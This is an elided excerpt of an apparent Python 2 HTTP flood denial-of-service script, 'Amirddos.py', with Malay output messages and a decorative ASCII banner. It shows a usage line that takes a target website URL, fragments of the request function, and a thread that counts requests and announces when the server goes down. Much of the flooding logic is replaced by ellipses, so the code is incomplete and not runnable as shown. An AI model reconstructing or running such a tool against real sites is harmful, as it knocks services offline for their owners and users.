...
def usage():
	print 'Contoh cara guna'
	print' '
	print '\033[34mpython2 Amirddos.py http://www.contoh.com\033[36;1m'
	print "\a"
print """
\033[32;1m                           .
             ,----------------,              ,---------,
     ...
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |      \033[33;1mSELAMAT\033[32;1m    |  |  |     |         |      |
     |  |      \033[33;1mDATANG\033[32;1m     |  |  |/----|`---=    |      |
     |  |  \033[31mC\033[97m:\>\033[36;1m_Tuan_Amir\033[32;1m |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
...
/_==__==========__==_ooo__ooo=_/'   /___________,"\033[91;1m

                \033[90;1mLife Of Programmer\033[91;1m
             Powered by:\033[97m Amir47Official """
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print '[+] ~> Server down atau Server tidak dapat diserang  <~ [+]'
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d (= Server down atau Server tidak dapat diserang=}" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -fall and not get up"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "\033[36;1mMade in Amir47Official"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
